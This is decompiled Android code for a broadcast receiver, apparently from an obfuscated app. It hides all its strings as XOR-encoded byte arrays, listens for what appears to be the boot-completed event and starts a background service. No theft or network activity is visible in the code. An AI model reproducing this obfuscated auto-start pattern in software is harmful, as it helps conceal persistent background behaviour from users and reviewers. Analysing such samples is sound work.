package com.example.navistart;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import com.bumptech.glide.RunnableC1054m;
import java.util.HashMap;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import kotlin.p118io.encoding.Base64;
import p047e0.AbstractC1387m;
import p047e0.AbstractC1434w;
import p047e0.C1343d0;
import p047e0.RunnableC1375j2;
import p078h0.C1652b;

/* JADX INFO: compiled from: r8-map-id-94e2637d1b30c6542972a7fc4ced35aa6da258c4e6702fc7c9cbf0ebc32bec75 */
/* JADX INFO: loaded from: classes.dex */
public class SystemMessageReceiver extends BroadcastReceiver {

    /* JADX INFO: renamed from: e */
    public static final /* synthetic */ int f1635e = 0;

    /* JADX INFO: renamed from: b */
    public Context f1637b;

    /* JADX INFO: renamed from: c */
    public Boolean f1638c;

    /* JADX INFO: renamed from: a */
    public final ScheduledThreadPoolExecutor f1636a = AbstractC1434w.m2482c(-1, AbstractC1387m.m2421h(new byte[]{103, 46, 42, 125, 18, -37, 19, -6, 71, 36, 56, 110, 18, -28, 59, -4, 81, 62, 47, 108, 5}, new byte[]{52, 87, 89, 9, 119, -74, 94, -97}));

    /* JADX INFO: renamed from: d */
    public final RunnableC1054m f1639d = new RunnableC1054m(1, this);

    /* JADX INFO: renamed from: a */
    public static void m1583a(Context context) {
        Intent intent = new Intent(context.getApplicationContext(), (Class<?>) boot.class);
        intent.putExtra(AbstractC1387m.m2421h(new byte[]{-121}, new byte[]{-29, -78, 38, -20, -67, 106, 112, 103}), -1);
        if (Build.VERSION.SDK_INT >= 26) {
            context.getApplicationContext().startForegroundService(intent);
        } else {
            context.getApplicationContext().startService(intent);
        }
    }

    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        this.f1637b = context;
        this.f1638c = Boolean.TRUE;
        new HashMap();
        C1343d0.m2389d(context);
        C1652b.m2750v(AbstractC1387m.m2421h(new byte[]{97, -45, -99, -74, 94, 28, 52, -34, 65, -39, -113, -91, 94, 35, 28, -40, 87, -61, -104, -89, 73, 81, 84, -101, 97, -34, -113, -80, 79}, new byte[]{50, -86, -18, -62, 59, 113, 121, -69}));
        String action = intent.getAction();
        C1652b.m2750v(AbstractC1387m.m2421h(new byte[]{98, -81, 102, 1, 101, 21, 100, 111, 66, -91, 116, 18, 101, 42, 76, 105, 84, -65, 99, 16, 114, 88, 4, 42}, new byte[]{49, -42, 21, 117, 0, 120, 41, 10}) + action.toString());
        AbstractC1434w.m2482c(-1, AbstractC1387m.m2421h(new byte[]{43, 74, 97, -60, -84, 86, -75, -124, 11, 64, 115, -41, -84, 105, -99, -126, 29, 90, 100, -43, -69}, new byte[]{120, 51, 18, -80, -55, 59, -8, -31})).schedule(new RunnableC1375j2(2, this, context), 10000L, TimeUnit.MILLISECONDS);
        Log.e(AbstractC1387m.m2421h(new byte[]{5, -79, 41}, new byte[]{86, -4, 123, 71, -47, -3, 82, 75}), action.toString());
        if (action.equals(AbstractC1387m.m2421h(new byte[]{67, -60, 66, -102, 49, 28, -105, -14, 75, -60, 82, -115, 48, 1, -35, -67, 65, -34, 79, -121, 48, 91, -79, -109, 109, -2, 121, -85, 17, 56, -93, -112, 103, -2, 99, -84}, new byte[]{34, -86, 38, -24, 94, 117, -13, -36}))) {
            Log.e(AbstractC1387m.m2421h(new byte[]{94, 115, -92, 6, -79, 60, -29, 71, 126, 121, -74, 21, -79, 3, -53, 65, 104, 99, -95, 23, -90}, new byte[]{13, 10, -41, 114, -44, 81, -82, 34}), AbstractC1387m.m2421h(new byte[]{121, 114, 41, 30, -114, 120, 118, 126, 74, 121, 46, 9, -120, 103, 119, 112, 66, 121, 62, 30, -119, 122, Base64.padSymbol, 63, 72, 99, 35, 20, -119, 32, 81, 17, 100, 67, 21, 56, -88, 67, 67, 18, 110, 67, 15, 63}, new byte[]{43, 23, 74, 123, -25, 14, 19, 94}));
            if (boot.m1611b(this.f1637b) && this.f1638c.booleanValue()) {
                throw null;
            }
            m1583a(this.f1637b);
        }
        C1343d0.m2389d(context);
    }
}
